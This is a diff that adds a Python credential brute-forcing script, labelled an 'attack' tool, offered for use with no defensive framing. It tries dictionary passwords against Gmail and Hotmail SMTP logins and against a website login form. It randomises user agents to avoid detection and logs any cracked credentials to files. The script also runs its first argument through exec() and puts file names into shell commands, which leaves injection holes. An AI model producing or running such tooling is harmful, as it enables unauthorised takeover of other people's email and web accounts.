@@ -1,0 +1,179 @@
+#!/usr/bin/python3
+import os,sys,smtplib,re,readline,subprocess
+import mechanize, random, time
+from email.mime.text import MIMEText
+
+# Funtion for create a resume's file at dictionary
+def file_resume(overwrite,last_password,filedic):
+	count=0
+	dic=open(filedic,"r")
+	for line in dic:
+		if line!=password:
+			count+=1
+		if line==password:
+			break;
+	print("count: "+str(count))
+	if overwrite==True:
+		os.system("sed -i  '1,"+str(count)+"d\' "+str(filedic))
+		sys.exit()
+	else:
+		files=str(subprocess.check_output("ls "+str(filedic)+".restore* 2> /dev/null | wc -l", shell=True))
+		files=files.replace("b","").replace("\'","").replace("\\n","")
+		files=int(files)
+		if files==0:
+			os.system("sed -e  '1,"+str(count)+"d\' "+str(filedic)+" > "+str(filedic)+".restore")
+#'Validate' class wih 'email' function for validate 'email_input' variable
+class Validate:
+	def email(self, email):
+		check=False
+		lista=[]
+		if email.count("@")==1:
+			lista=email.split("@")
+			if lista[0].find("@")!=-1 or lista[0].find("\\")!=-1 or lista[0].find("º")!=-1 or lista[0].find("ª")!=-1 or lista[0].find("!")!=-1 or lista[0].find("\"")!=-1 or lista[0].find("·")!=-1 or lista[0].find("$")!=-1 or lista[0].find("%")!=-1 or lista[0].find("/")!=-1 or lista[0].find("(")!=-1 or lista[0].find(")")!=-1 or lista[0].find("=")!=-1 or lista[0].find("?")!=-1 or lista[0].find("¿")!=-1 or lista[0].find("'")!=-1 or lista[0].find("¡")!=-1 or lista[0].find("`")!=-1 or lista[0].find("\'")!=-1 or lista[0].find("+")!=-1 or lista[0].find("|")!=-1 or lista[0].find("#")!=-1 or lista[0].find("~")!=-1 or lista[0].find("½")!=-1 or lista[0].find("¬")!=-1 or lista[0].find("{")!=-1 or lista[0].find("[")!=-1 or lista[0].find("]")!=-1 or lista[0].find("}")!=-1 or lista[0].find("-")!=-1 or lista[0].find("_")!=-1 or lista[0].find(":")!=-1 or lista[0].find(";")!=-1 or lista[0].find(",")!=-1 or lista[0].find("&")!=-1 or lista[0].find("€")!=-1:
+				check=False
+			else:
+				check=True
+				if str(lista[1]).count(".")==1:
+               				pass
+				else:
+					check=False
+		else:
+			check=False
+		return check
+try:
+	args=sys.argv
+	if len(args)==1 or len(args)==2:
+	        print("\033[1;31m[-]\033[0m It needs two arguments:\n\t./attack <output:boolean> '<dictionary>'\n \033[1;31mVery important the single quotes\033[0m")
+	        sys.exit()
+	output=args[1] #boolean
+	#file or dictioanry's list
+	dic=args[2]
+	filedic=args[2]
+	exec("output="+str(output))
+	if output==False and dic.count("<<==>>")==0:
+		print("\033[1;31m[-]\033[0m You need <<==>> for separate the passwords e.i: 'password1<<==>>password2...'")
+		sys.exit()
+	if output==True:
+		dic=open(dic,"r")
+	else:
+		dic=dic.split("<<==>>")
+	print("""
+ /﹋\                          _
+(҂`_´)        /  _    _/  _   (_     _  _  _
+<,︻╦╤─ ҉ - - () /  (/ /  (-   /  () /  (  (-
+/﹋\\
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
+	""")
+	validate=Validate()
+	email=False
+	print("""
+	●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
+		1) GMAIL (@gmail.com)
+		2) HOTMAIL (@hotmail.com or @outlook.com)
+		3) website
+	●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
+""")
+	server_input=""
+	service=int(input("Choose: "))
+	server_name=""
+	if service==1:
+		server_input="smtp.gmail.com"
+		server_name="GMAIL"
+		print("""
+<<<<===============     GMAIL     ===============>>>>
+		""")
+	elif service==2:
+		server_input="smtp.live.com"
+		server_name="HOTMAIL"
+		print("""
+<<<<===============     HOTMAIL     ===============>>>>
+		""")
+	elif service==3:
+		server_name="WEBSITE"
+		print("""
+<<<<===============     WEBSITE     ===============>>>>
+		""")
+# attack email
+	if service==1 or service==2:
+		while email==False:
+			email_input=str(input("email: "))
+			if validate.email(email_input)==False:
+				print("\033[1;31m[-]\033[0m Invalid email")
+				email=False
+			else:
+				email=True
+		for password in dic:
+			try:
+				smtp=smtplib.SMTP(server_input,587)
+				smtp.ehlo()
+				smtp.starttls()
+				password=password.replace("\n","")
+				smtp.login(email_input,password)
+				print("\033[1;32m[+]\033[0m user:"+str(email_input)+" password:"+str(password))
+				f=open("passwords_emails.txt","a")
+				f.write(str(server_name)+" ==>>  user: "+str(email_input)+" password: "+str(password))
+				f.close()
+				smtp.quit()
+				break;
+			except smtplib.SMTPAuthenticationError:
+				print("\033[1;31m[-]\033[0m not found: "+str(password)+" email: "+str(email_input))
+			except smtplib.SMTPServerDisconnected:
+				print("\033[1;31m [!]\033[0m Disconnect")
+				break;
+				print(sys.exc_info())
+			except KeyboardInterrupt:
+				print("Last password: "+str(password))
+				if output==True:
+					resume=input("Do you want to save a file for resume attack? [y/n] ")
+					boolean_resume=False
+					if resume=="y" or resume=="Y":
+						boolean_resume=True
+					else:
+						sys.exit()
+					overwrite=input("overwriting the original dictionary? [y/n] ")
+					boolean_overwrite=False
+					if overwrite=="y" or overwrite=="Y":
+							boolean_overwrite=True
+					file_resume(boolean_overwrite,password,filedic)
+				sys.exit()
+#Attack website
+	elif service==3:
+		print("""
+		""")
+		username=str(input("username: "))
+		time.sleep(1)
+		for password in dic:
+			try:
+				browser=mechanize.Browser()
+				browser.set_handle_robots(False) #not handle robots
+				useragents=[
+					'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.19) Gecko/20081202 Firefox (Debian-2.0.0.19-0etch1)',
+					'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
+					'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
+					'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6'
+				]
+				browser.addheaders=[('User-Agent',random.choice(useragents))] # client type random
+				website=browser.open("website/login")
+				browser.select_form(predicate=lambda frm: 'id' in frm.attrs and frm.attrs['id'] == 'form_login')
+				browser.form["name_username"]=username
+				browser.form["name_password"]=password
+				browser.method="POST"
+				submit=browser.submit()
+				text=str(submit.read())
+				# if the Page source has the string 'dashboard', this means that, it was logged successfully.
+				if text.count("dashboard")>0:
+					print("\033[1;32m[+]\033[0m user:"+str(username)+" password:"+str(password))
+					f=open("password_website","a")
+					f.write(str(server_name)+" ==>> "+"username: "+str(username)+" password: "+str(password))
+					f.close()
+					break
+				else:
+					print("\033[1;31m[-]\033[0m not found: "+str(password)+" email: "+str(username))
+					time.sleep(1)
+			except:
+				print("\033[1;31m[!] WARNING!\033[0m Fatal error in the login")
+				print(sys.exc_info())
+except KeyboardInterrupt:
+        print("\nOh! What happened? :O")
+except ValueError:
+        print("\033[1;31m[-]\033[0m Error at type a value. Incorrect value or you don't type nothing.")
